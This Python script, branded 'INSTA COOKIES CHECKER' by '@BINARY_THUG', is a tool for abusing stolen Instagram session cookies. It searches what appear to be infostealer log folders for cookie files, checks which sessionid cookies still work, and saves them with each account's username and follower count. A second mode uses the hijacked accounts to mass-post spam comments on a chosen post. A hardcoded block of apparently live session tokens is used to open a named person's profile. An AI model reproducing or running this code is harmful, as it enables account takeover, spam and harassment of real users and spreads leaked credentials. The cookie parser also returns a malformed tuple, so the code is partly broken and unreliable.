import requests
import re
from datetime import datetime
import os
import ctypes
from concurrent.futures import ThreadPoolExecutor
import threading
import easygui
from conn import conn
import colorama
import random
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
class INSTAGRAM:
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def __init__(self) -> None:
        self.invalid = 0
        self.valid = 0
        self.Total = 0
        self.qoutedvalid=0
        self.qoutedinvalid=0
        self.glob_tr=True
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'INSTA COOKIES CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
██╗███╗   ██╗███████╗████████╗ █████╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║██╔██╗ ██║███████╗   ██║   ███████║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██║██║╚██╗██║╚════██║   ██║   ██╔══██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║██║ ╚████║███████║   ██║   ██║  ██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                                                                               
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[INSTA Checker]--BY @BINARY_THUG|VALIDS:{self.valid}|INVALIDS:{self.invalid}|TOTAL LOGS FOLDER:{len(lin)}")
    def extract_checksessionid(self,path,dt,filename):
      for root,dirs,files in os.walk(path):
         for fil in files:
            if str(fil).endswith(".txt"):
               sun=os.path.join(root,fil)
               threads,insta_lines=self.net_to_cookie(sun,"instagram")
               if "sessionid" in threads:
                   tr=self.getuserinfo(threads,insta_lines,filename,dt,fil)
               else:
                   self.invalid=self.invalid+1
                   print(colorama.Fore.RED+"[*] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                   continue
    def center(self, var: str, space: int = None): 
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())

    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE','Cookies'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, 
    def mass_dm(self):
        sb=webdriver.Firefox()
        sb.get("https://www.instagram.com/")
        cookie = {
    'datr': 'QC4pZtYrGs0wd4CJ-ImeZgVC',
    'ig_did': '6DDF5C71-8F40-4085-B81D-63D082A66B88',
    'mid': 'Zi5tOAALAAGKVZSMczFaQVf7lKE0',
    'shbid': '7640\0549708602258\0541746379321:01f7d06c0331b7292fbe13ccee91be8860e2a2177b5036bff4195645057cb03e9cfa5b9f',
    'shbts': '1714843321\0549708602258\0541746379321:01f768737297ea792b1e66bc48520ebbb3e7da9b057fbf523aeb3645a0ab2c1bdfc5949e',
    'ps_l': '1',
    'ps_n': '1',
    'sessionid': '9708602258%3AXqbQ64IeS6eDlO%3A11%3AAYeJ3_QhSn0XbKIryE8iuHGP97ZI9xtsixdhaSZfTVU',
    'csrftoken': 'BmlKnGL2fLqsrCPw8S2msWgoGgvXKsw5',
    'ds_user_id': '9708602258                                                     '
}

        for key,value in cookie.items():
            sb.add_cookie({'name': key, 'value': value})
        sb.get("https://www.instagram.com/")
        sb.get("https://www.instagram.com/zainabkashifbutt")
        time.sleep(24)
    def spam_comments(self,cookies,postid,comments,filname):
        BINA=f"https://www.instagram.com/api/v1/web/comments/{postid}/add/"
        important={"comment_text":f"{comments}"}
        lenghyt=len(str(important))
        cookie_string = "; ".join([f"{name}={value}" for name, value in cookies.items()])
        try:
            csrf=cookies['csrftoken']
        except:
            print(f"[{colorama.Fore.GREEN}*{colorama.Fore.RESET}]ERROR OCCURED ON POST ID {postid}")
            return None
        braed_dead = {
    'Host': 'www.instagram.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-CSRFToken': f'{csrf}',
    'X-Instagram-AJAX': '1011346876',
    'X-IG-App-ID': '936619743392459',
    'X-ASBD-ID': '129477',
    'X-IG-WWW-Claim': 'hmac.AR2gKzfH_xWIjILWBO3xgG1bFL5gA0JiR5f78643vCYKgHCM',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.instagram.com',
    'DNT': '1',
    'Sec-GPC': '1',
    "Content-Length": f"{lenghyt}",
    'Connection': 'keep-alive',
    'Referer': '',
    'Cookie': cookie_string,
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'TE': 'trailers'
}
        HECKS=conn((requests.post),BINA,data=important,headers=braed_dead,verify=False,filesname=filname)
        if '"ok"' in HECKS.text:
            print(f"[{colorama.Fore.GREEN}*{colorama.Fore.RESET}]ENTERED COMMENT SUCCESSFULLY ON POST ID {postid}")
            self.qoutedvalid=self.qoutedvalid+1
        else:
            self.qoutedinvalid=self.qoutedinvalid+1
            print(f"[{colorama.Fore.GREEN}*{colorama.Fore.RESET}]ERROR OCCURED ON POST ID {postid}")
    def returnrandom(self,txtfiles):
        with open(txtfiles,'r',errors='ignore',encoding='utf-8') as veta:
            return random.choice(veta.readlines())
    def cookie_list(self,pathcookiesdir):
        cok_list=[]
        for root,dirs,files in os.walk(pathcookiesdir):
            for file in files:
                if str(file).endswith(".txt"):
                    cok_list.append(os.path.join(root,file))
        return cok_list
    def spam_runner(self,path,commenttxt,postid,filename,qauntity):
        get_cookie_list=self.cookie_list(path) 
        with ThreadPoolExecutor(max_workers=3) as executor:
            for i in range(int(qauntity)):
                cookies,lines=self.net_to_cookie(random.choice(get_cookie_list),'instagram')
                try:
                    comment_text = str(self.returnrandom(commenttxt)).replace("\n","")
                    executor.submit(self.spam_comments,cookies,postid,comment_text,filename)
                except:
                    continue
            executor.shutdown(wait=True)
            self.ui()
            
            
            
        
                    
#)            
        

    def getuserinfo(self,cookie,insta_lines,filename,dt,fil):
        cookie_string = "; ".join([f"{name}={value}" for name, value in cookie.items()])
        uru='https://www.instagram.com/api/v1/accounts/edit/web_form_data/'
        headers = {
    'Host': 'www.instagram.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-CSRFToken': 'missing',
    'X-IG-App-ID': '936619743392459',
    'X-ASBD-ID': '129477',
    'X-IG-WWW-Claim': 'hmac.AR3DNG72SHRcXDWltkYUR3AV_I3ohaUf6OTamLhv7kSyVC4W',
    'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive',
    'Referer': 'https://www.instagram.com/accounts/edit/',
    'Cookie': cookie_string,
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
   }
        try:
            txt=conn((requests.get),uru,headers=headers,verify=False,filesname=filename).json()
            username=txt["form_data"]["username"]
            uri_2=f"https://www.instagram.com/{username}/?next=%2F"
        except Exception  as e:
            self.invalid=self.invalid+1
            print(colorama.Fore.RED+"[*] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            return None
        dead = {
    'Host': 'www.instagram.com',
    'Cookie':cookie_string,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20103101 Firefox/120.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1'
}  
        profile_api_url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
        he = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; GM1903 Build/PKQ1.190110.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 Instagram 103.1.0.15.119 Android (28/9; 420dpi; 1080x2260; OnePlus; GM1903; OnePlus7; qcom; sv_SE; 164094539)",
    'Cookie':cookie_string,
}
        try:
            radha=conn((requests.get),profile_api_url,headers=he,filesname=filename).json()
            followers_count = radha['data']['user']['edge_followed_by']['count']
            following_count = radha['data']['user']["edge_follow"]['count']
        except:
            self.invalid=self.invalid+1
            return None
        out=os.path.join(dt,f"[{username}][{followers_count}][{following_count}].txt")
        with open(out,'w',errors='ignore',encoding='utf-8') as omega:
            for line in insta_lines:
                omega.write(line)
            omega.write(f"\n\n==========================================\n\nUSERNAME:{username}\nFOLLOWER:{followers_count}\nFOLLOWING:{following_count}")
        print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
        self.valid=self.valid+1
    def runner(self,logs_path,workers,datetime,proxy):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.extract_checksessionid,pat,datetime,proxy)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
        
            
    
        
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)      
def main():
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    os.system("cls")
    NF=INSTAGRAM()
    NF.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER
    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] SPAM COMMENT
    [{colorama.Fore.CYAN}3{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        logs_pathi=easygui.diropenbox(title="INSTA COOKIE CHECKER- SELECT LOGS FOLDER")
        p=easygui.fileopenbox(title="INSTA COOKIE CHECKER- SELECT PROXY FILE",filetypes=["*.txt"],multiple=False)
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>26:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 25 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
            
        os.system("cls")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        NF.runner(logs_pathi,int(thread_num),s,proxy=p)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR INSTA COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[INSTA COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{NF.valid}|INVALIDS:{NF.invalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        logs_pathi=easygui.diropenbox(title="INSTA SPAMMER- SELECT COOKIES FOLDER")
        p=easygui.fileopenbox(title="INSTA SPAMMER- SELECT PROXY FILE",filetypes=["*.txt"],multiple=False)
        COMMENTS=easygui.fileopenbox(title="INSTA SPAMMER- SELECT COMMENT FILE",filetypes=["*.txt"],multiple=False)
        postid=input(f"[{colorama.Fore.GREEN}*{colorama.Fore.RESET}]ENTER POST ID:")
        qunatiy=input(f"[{colorama.Fore.GREEN}*{colorama.Fore.RESET}]ENTER NUMBERS OF SPAM:")
        NF.spam_runner(logs_pathi,COMMENTS,postid,p,qunatiy)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY SPAMING FRIENDS"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[INSTA COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{NF.qoutedvalid}|INVALIDS:{NF.qoutedinvalid}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
        
    elif type=="3":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
main()